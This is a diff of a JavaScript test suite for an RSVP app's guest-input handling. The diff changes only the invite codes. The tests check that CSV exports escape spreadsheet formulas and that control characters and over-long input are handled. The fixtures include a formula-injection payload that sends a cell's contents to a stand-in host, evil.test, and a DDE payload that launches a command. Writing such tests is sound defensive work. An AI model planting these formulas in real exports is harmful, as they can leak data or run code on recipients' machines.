@@ -43,9 +43,9 @@ test("csvSafe leaves ordinary values untouched", () => {
 
 test("a formula in a guest name never reaches the export unescaped", async () => {
   const { store, app } = setup();
-  const inv = store.createInvitee({ name: "Mallory Mills", plus_ones_allotted: 1, invite_code: "M1" });
+  const inv = store.createInvitee({ name: "Mallory Mills", plus_ones_allotted: 1, invite_code: "1000000001" });
 
-  const res = await rsvpAs(app, "M1", {
+  const res = await rsvpAs(app, "1000000001", {
     attending: true,
     email: "m@example.com",
     attendees: [{ name: '=HYPERLINK("http://evil.test?x="&A1,"click")', dietary: "=cmd|'/c calc'!A0" }],
@@ -57,9 +57,9 @@ test("a formula in a guest name never reaches the export unescaped", async () =>
 
 test("a formula appended to a real name is exported as inert text", async () => {
   const { store, app } = setup();
-  store.createInvitee({ name: "Mallory Mills", plus_ones_allotted: 1, invite_code: "M1" });
+  store.createInvitee({ name: "Mallory Mills", plus_ones_allotted: 1, invite_code: "1000000001" });
 
-  const res = await rsvpAs(app, "M1", {
+  const res = await rsvpAs(app, "1000000001", {
     attending: true,
     email: "m@example.com",
     message: "=1+1",
@@ -80,9 +80,9 @@ test("a formula appended to a real name is exported as inert text", async () => 
 
 test("the caterer export escapes guest-supplied dietary notes", async () => {
   const { store, app } = setup();
-  store.createInvitee({ name: "Cat Erer", plus_ones_allotted: 1, invite_code: "M1" });
+  store.createInvitee({ name: "Cat Erer", plus_ones_allotted: 1, invite_code: "1000000001" });
 
-  const res = await rsvpAs(app, "M1", {
+  const res = await rsvpAs(app, "1000000001", {
     attending: true,
     email: "c@example.com",
     attendees: [{ name: "Cat Erer", dietary: "=1+1" }],
@@ -99,9 +99,9 @@ test("the caterer export escapes guest-supplied dietary notes", async () => {
 
 test("control characters are stripped from guest input", async () => {
   const { store, app } = setup();
-  const inv = store.createInvitee({ name: "Nina Novak", plus_ones_allotted: 1, invite_code: "N1" });
+  const inv = store.createInvitee({ name: "Nina Novak", plus_ones_allotted: 1, invite_code: "1000000002" });
 
-  const res = await rsvpAs(app, "N1", {
+  const res = await rsvpAs(app, "1000000002", {
     attending: true,
     email: "n@example.com",
     attendees: [{ name: "Nina\u0000\u200B\tNovak", dietary: "gluten\rfree" }],
@@ -115,10 +115,10 @@ test("control characters are stripped from guest input", async () => {
 
 test("international names and punctuation are accepted unchanged", async () => {
   const { store, app } = setup();
-  const inv = store.createInvitee({ name: "Renée O'Brien-Smith", plus_ones_allotted: 3, invite_code: "R1" });
+  const inv = store.createInvitee({ name: "Renée O'Brien-Smith", plus_ones_allotted: 3, invite_code: "1000000003" });
 
   const names = ["Renée O'Brien-Smith", "José García", "J.R. Smith", "李雷"];
-  const res = await rsvpAs(app, "R1", {
+  const res = await rsvpAs(app, "1000000003", {
     attending: true,
     email: "r@example.com",
     attendees: names.map((name) => ({ name })),
@@ -131,9 +131,9 @@ test("international names and punctuation are accepted unchanged", async () => {
 
 test("over-long input is capped rather than rejected", async () => {
   const { store, app } = setup();
-  const inv = store.createInvitee({ name: "Long Lars", invite_code: "L1" });
+  const inv = store.createInvitee({ name: "Long Lars", invite_code: "1000000004" });
 
-  const res = await rsvpAs(app, "L1", {
+  const res = await rsvpAs(app, "1000000004", {
     attending: true,
     email: "l@example.com",
     message: "m".repeat(5000),
